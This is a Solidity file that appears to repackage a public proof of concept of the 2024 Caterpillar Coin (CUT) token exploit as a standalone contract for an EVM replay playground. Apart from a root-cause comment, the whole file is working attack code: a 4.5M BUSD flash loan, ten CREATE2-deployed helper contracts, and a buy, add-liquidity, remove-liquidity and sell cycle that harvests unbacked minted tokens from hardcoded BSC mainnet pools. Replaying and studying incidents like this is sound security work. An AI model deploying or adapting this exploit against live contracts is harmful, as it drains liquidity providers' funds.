// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-09-Caterpillar_Coin_CUT).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// `ContractTest` (attacker == address(this), flash-swap callback `pancakeCall`
// lives on the test itself), and CREATE2-deploys 10 fresh `Attack` helper
// contracts whose CONSTRUCTOR does the actual buy/addLiquidity/removeLiquidity/
// sell work. There is no single standalone exploit contract, so this file
// faithfully copies both pieces (the outer flash-loan loop + the `Attack`
// helper) so the playground can deploy `CaterpillarDrain` and record `run()`.
// Logic and constants are copied verbatim from
// test/Caterpillar_Coin_CUT_exp.sol (testExploit + pancakeCall + calAddress/
// createContract + the Attack contract).
//
// Root cause: CUT token's `actDealLPRemoveBehavior` (Main.sol) credits a
// liquidity remover with `valuePreservationByRemoveLP(recipient, amount)` CUT
// ("price protection") whenever that value exceeds the amount actually removed
// from the pool. The surplus is credited via
// `_balances[recipient] = _balances[recipient].add(leftAmount - amount)` — a
// pure mint, not backed by any pool reserve, and immediately sellable back into
// the same BUSD/CUT pool. Wrapped in a flash loan and repeated 10x (buy -> add
// liquidity -> remove liquidity -> sell), this drains ~1.26M BUSD from the
// BUSD/CUT pool's real reserves.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniPairV2 {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address owner) external view returns (uint256);
}

interface IUniRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
}

contract CaterpillarDrain {
    IUniRouterV2 internal constant ROUTER = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 internal constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 internal constant CUT = IERC20(0x7057F3b0F4D0649B428F0D8378A8a0E7D21d36a7);
    IUniPairV2 internal constant WBNBUSDT2 = IUniPairV2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IUniPairV2 internal constant BUSDCUT = IUniPairV2(0x83681F67069A154815a0c6C2C97e2dAca6eD3249);

    uint256 internal borrowAmount;

    /// @notice Flash-borrow 4,500,000 BUSD from the WBNB/USDT pair. The pair's
    ///         `swap()` calls back into `pancakeCall` below before checking
    ///         repayment, which runs the whole 10-round attack loop.
    function run() external {
        borrowAmount = 4_500_000 ether;
        WBNBUSDT2.swap(
            borrowAmount,
            0,
            address(this),
            "0x0000000000000000000000000000000000000000000000000000000000000001"
        );
    }

    /// @notice PancakeSwap flash-swap callback. Runs the 10-round exploit loop:
    ///         each round CREATE2-deploys a fresh `Attack` helper, seeded with
    ///         3x the pool's current BUSD balance, whose constructor does the
    ///         buy -> addLiquidity -> removeLiquidity(mints free CUT) -> sell
    ///         cycle. Finally repays the flash loan (0.25% Pancake fee).
    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        for (uint256 i = 0; i < 10; i++) {
            uint256 attackBal = BUSD.balanceOf(address(BUSDCUT)) * 3;
            address attackAddr = calAddress(i);
            BUSD.transfer(attackAddr, attackBal);
            createContract(i);
        }

        // Repay: borrowAmount / 9975 * 10000 + 10000 (Pancake's 0.25% fee, rounded up).
        BUSD.transfer(msg.sender, ((borrowAmount / 9975) * 10_000) + 10_000);
    }

    function calAddress(uint256 salt) internal view returns (address) {
        bytes memory bytecode = type(Attack).creationCode;
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), salt, keccak256(bytecode)));
        return address(uint160(uint256(hash)));
    }

    function createContract(uint256 salt) internal returns (address) {
        bytes memory bytecode = type(Attack).creationCode;
        address addr;
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
        }
        return addr;
    }

    receive() external payable {}
}

// One round of the exploit: buy CUT, add liquidity, remove liquidity (this is
// where the CUT token over-mints the "value-preserved" surplus), sell the
// inflated CUT for BUSD, and forward all BUSD back to the loop contract
// (msg.sender = CaterpillarDrain, which deployed this helper via CREATE2).
contract Attack {
    IUniPairV2 internal constant BUSDCUT = IUniPairV2(0x83681F67069A154815a0c6C2C97e2dAca6eD3249);
    IERC20 internal constant BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 internal constant CUT = IERC20(0x7057F3b0F4D0649B428F0D8378A8a0E7D21d36a7);
    IUniRouterV2 internal constant ROUTER = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    constructor() {
        uint256 busdBal = BUSD.balanceOf(address(this));
        BUSD.approve(address(ROUTER), type(uint256).max);
        CUT.approve(address(ROUTER), type(uint256).max);

        // Step 1: buy CUT with 70% of the seeded BUSD.
        address[] memory path = new address[](2);
        path[0] = address(BUSD);
        path[1] = address(CUT);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            busdBal * 7 / 10, 0, path, address(this), block.timestamp + 1
        );

        // Step 2: add liquidity with 30% of the remaining BUSD + all bought CUT.
        uint256 busdBalNew = BUSD.balanceOf(address(this));
        uint256 cutBal = CUT.balanceOf(address(this));
        ROUTER.addLiquidity(
            address(BUSD), address(CUT), busdBalNew * 3 / 10, cutBal, 0, 0, address(this), block.timestamp + 1
        );

        // Step 3: swap the leftover CUT back to BUSD.
        uint256 cutBalNew = CUT.balanceOf(address(this));
        path[0] = address(CUT);
        path[1] = address(BUSD);
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            cutBalNew, 0, path, address(this), block.timestamp + 1
        );

        // Step 4: remove liquidity — transfer LP to the pair then burn(). This
        // is the vulnerable path: the CUT token classifies the resulting
        // pool -> this transfer as a "remove LP" (actFlag == 2) and mints a
        // "value-preserved" surplus (~4.5x the CUT actually removed) directly
        // into this contract's balance.
        BUSDCUT.transfer(address(BUSDCUT), BUSDCUT.balanceOf(address(this)));
        BUSDCUT.burn(address(this));

        // Step 5: sell all the (mostly free-minted) CUT back for BUSD.
        cutBalNew = CUT.balanceOf(address(this));
        ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            cutBalNew, 0, path, address(this), block.timestamp + 1
        );

        // Forward all BUSD profit back to the loop contract (msg.sender here
        // is CaterpillarDrain, since it deployed this helper via CREATE2).
        BUSD.transfer(msg.sender, BUSD.balanceOf(address(this)));
    }
}
